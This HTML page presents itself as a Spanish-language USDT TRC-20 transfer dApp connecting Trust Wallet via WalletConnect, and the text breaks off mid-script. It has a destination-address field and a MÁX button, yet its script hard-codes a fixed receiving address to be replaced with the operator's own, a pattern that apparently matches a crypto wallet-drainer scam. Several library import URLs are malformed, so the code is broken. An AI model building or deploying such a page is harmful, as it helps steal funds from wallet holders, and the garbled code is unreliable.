<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dApp USDT TRC-20 - Transferencia de Saldo</title>
    
    <!-- ============================================================
         ESTILOS INTERFAZ GRÁFICA (CSS)
         ============================================================ -->
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background-color: #1e293b;
            border-radius: 12px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }
        h2 {
            margin-bottom: 20px;
            text-align: center;
            font-size: 24px;
            color: #38bdf8;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #94a3b8;
        }
        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        input {
            width: 100%;
            padding: 12px;
            padding-right: 65px;
            background-color: #0f172a;
            border: 1px solid #334155;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #38bdf8;
        }
        .input-btn {
            position: absolute;
            right: 8px;
            background-color: #334155;
            color: #38bdf8;
            border: none;
            padding: 6px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            font-weight: bold;
        }
        .input-btn:hover {
            background-color: #475569;
        }
        .address-action-container {
            display: flex;
            gap: 10px;
            margin-top: 5px;
        }
        .address-btn {
            flex: 1;
            padding: 8px;
            background-color: #334155;
            color: #cbd5e1;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
        }
        .address-btn:hover {
            background-color: #475569;
        }
        #connectBtn {
            width: 100%;
            padding: 14px;
            background: #908cf2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        #connectBtn:disabled {
            background: #475569 !important;
            cursor: not-allowed;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            text-align: center;
            display: none;
            word-break: break-all;
        }
        .status.info { background-color: #1e3a8a; color: #93c5fd; }
        .status.success { background-color: #064e3b; color: #6ee7b7; }
        .status.error { background-color: #7f1d1d; color: #fca5a5; }

        #techLogger {
            background-color: #020617;
            color: #22c55e;
            font-family: monospace;
            padding: 15px;
            margin-top: 25px;
            border-radius: 6px;
            font-size: 11px;
            max-height: 180px;
            overflow-y: auto;
            border: 1px solid #1e293b;
        }
        #techLogger h4 { margin-bottom: 8px; color: #f8fafc; }
        .log-item { margin-bottom: 6px; padding-bottom: 4px; border-bottom: 1px solid #1e293b; }
    </style>

    <!-- ============================================================
         DEPENDENCIAS WEB3 Y REDIRECCIÓN COMPLETA A TRUST WALLET
         ============================================================ -->
    <script src="https://jsdelivr.net"></script>
    <script type="module">
        import { createAppKit } from 'https://esm.sh'
        import { tron } from 'https://esm.sh/networks'
        import { WagmiAdapter } from 'https://esm.sh-adapter-wagmi'

        // Inicializamos el adaptador necesario para interceptar Deep Links móviles
        const wagmiAdapter = new WagmiAdapter({
            networks: [tron],
            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT' // Reemplazar con ID de ://walletconnect.com
        });

        // Configuración avanzada del Modal con soporte nativo para Trust Wallet móvil
        const modal = createAppKit({
            adapters: [wagmiAdapter], 
            networks: [tron],
            metadata: {
                name: 'dApp USDT TRC-20',
                description: 'Verificación de transacciones',
                url: window.location.origin,
                icons: ['https://githubusercontent.com']
            },
            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT',
            features: {
                analytics: false,
                email: false,     
                socials: false    
            }
        });
        window.WalletConnectModal = modal;
    </script>
</head>
<body>

    <div class="container" id="dappContainer">
        <h2>Enviar USDT (TRC-20)</h2>
        
        <!-- Campo Cantidad -->
        <div class="form-group">
            <label for="amountInput">Cantidad a enviar</label>
            <div class="input-wrapper">
                <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
                <button type="button" class="input-btn max">MÁX</button>
            </div>
            <div class="address-action-container">
                <button type="button" class="address-btn clear">Limpiar campo</button>
            </div>
        </div>

        <!-- Campo Dirección -->
        <div class="form-group">
            <label for="addressInput">Dirección de destino</label>
            <div class="input-wrapper">
                <input type="text" id="addressInput" placeholder="Dirección TRON (T...)" autocomplete="off">
            </div>
            <div class="address-action-container">
                <button type="button" class="address-btn address-action paste">Pegar</button>
            </div>
        </div>

        <!-- Botón Principal -->
        <button id="connectBtn">Siguiente</button>

        <!-- Mensajes del Sistema -->
        <div id="status" class="status"></div>

        <!-- Consola de Auditoría -->
        <div id="techLogger">
            <h4>📋 Registro de Auditoría Web3</h4>
            <div id="logContent">Sección lista para monitorizar la blockchain...</div>
        </div>
    </div>

    <!-- ============================================================
         LÓGICA UNIFICADA DE LA APLICACIÓN (JAVASCRIPT)
         ============================================================ -->
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            'use strict';

            // Referencias del DOM
            const btn = document.getElementById('connectBtn');
            const input = document.getElementById('amountInput');
            const addressInput = document.getElementById('addressInput');
            const status = document.getElementById('status');
            const clearBtn = document.querySelector('.clear');
            const maxBtn = document.querySelector('.max');
            const pasteBtn = document.querySelector('.address-action.paste');
            const logContent = document.getElementById('logContent');

            // Variables de Estado Interno
            let procesoEnCurso = false;
            let activeProviderType = null; 
            let connectedAddress = null;

            // CONFIGURACIÓN DE BLOQUE
            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT Oficial en TRON Mainnet
            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA

            // ============================================================
            // MANEJO DE ESTADOS DE LA INTERFAZ VISUAL
            // ============================================================
            function setStatus(message, type = '') {
                if (!status) return;
                status.textContent = message || '';
                status.className = 'status' + (type ? ' ' + type : ' info');
                status.style.display = message ? 'block' : 'none';
            }

            function setButton(text, disabled = false) {
                if (!btn) return;
                btn.textContent = text;
                btn.disabled = disabled;
            }

            function logger(titulo, datos) {
                if (!logContent) return;
                if (logContent.textContent.includes('Sección lista')) logContent.innerHTML = '';
                const item = document.createElement('div');
                item.className = 'log-item';
                item.innerHTML = `<strong>[${new Date().toLocaleTimeString()}] ${titulo}:</strong> <span style="color: #ce9178;">${JSON.stringify(datos)}</span>`;
                logContent.appendChild(item);
                document.getElementById('techLogger').scrollTop = document.getElementById('techLogger').scrollHeight;
            }
